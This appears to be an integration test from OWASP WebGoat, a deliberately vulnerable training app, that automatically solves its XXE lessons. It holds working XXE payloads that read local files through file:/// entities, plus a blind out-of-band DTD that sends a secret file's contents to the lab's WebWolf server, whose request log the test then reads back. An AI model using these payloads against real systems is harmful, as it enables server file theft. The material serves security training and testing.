package org.owasp.webgoat;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.junit.jupiter.api.Test;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;

public class XXETest extends IntegrationTest {

    private static final String xxe3 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
    private static final String xxe4 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
    private static final String dtd7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"file:SECRET\"><!ENTITY % all \"<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>\">%all;";
    private static final String xxe7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM \"WEBWOLFURL/USERNAME/blind.dtd\">%remote;]><comment><text>test&send;</text></comment>";

    private String webGoatHomeDirectory;
    private String webwolfFileDir;

    @Test
    public void runTests() throws IOException {
        startLesson("XXE");
        webGoatHomeDirectory = getWebGoatServerPath();
        webwolfFileDir = getWebWolfServerPath();
        checkAssignment(url("/WebGoat/xxe/simple"), ContentType.XML, xxe3, true);
        checkAssignment(url("/WebGoat/xxe/content-type"), ContentType.XML, xxe4, true);
        checkAssignment(url("/WebGoat/xxe/blind"), ContentType.XML, "<comment><text>" + getSecret() + "</text></comment>", true);
        checkResults("xxe/");
    }

    /**
     * This performs the steps of the exercise before the secret can be committed in the final step.
     *
     * @return
     * @throws IOException
     */
    private String getSecret() throws IOException {
        //remove any left over DTD
        Path webWolfFilePath = Paths.get(webwolfFileDir);
        if (webWolfFilePath.resolve(Paths.get(getWebgoatUser(), "blind.dtd")).toFile().exists()) {
            Files.delete(webWolfFilePath.resolve(Paths.get(getWebgoatUser(), "blind.dtd")));
        }
        String secretFile = webGoatHomeDirectory.concat("/XXE/secret.txt");
        String dtd7String = dtd7.replace("WEBWOLFURL", webWolfUrl("/landing")).replace("SECRET", secretFile);

        //upload DTD
        RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("WEBWOLFSESSION", getWebWolfCookie())
                .multiPart("file", "blind.dtd", dtd7String.getBytes())
                .post(webWolfUrl("/WebWolf/fileupload"))
                .then()
                .extract().response().getBody().asString();
        //upload attack
        String xxe7String = xxe7.replace("WEBWOLFURL", webWolfUrl("/files")).replace("USERNAME", getWebgoatUser());
        checkAssignment(url("/WebGoat/xxe/blind?send=test"), ContentType.XML, xxe7String, false);

        //read results from WebWolf
        String result = RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("WEBWOLFSESSION", getWebWolfCookie())
                .get(webWolfUrl("/WebWolf/requests"))
                .then()
                .extract().response().getBody().asString();
        result = result.replace("%20", " ");
        result = result.substring(result.lastIndexOf("WebGoat 8.0 rocks... ("), result.lastIndexOf("WebGoat 8.0 rocks... (") + 33);
        return result;
    }
}
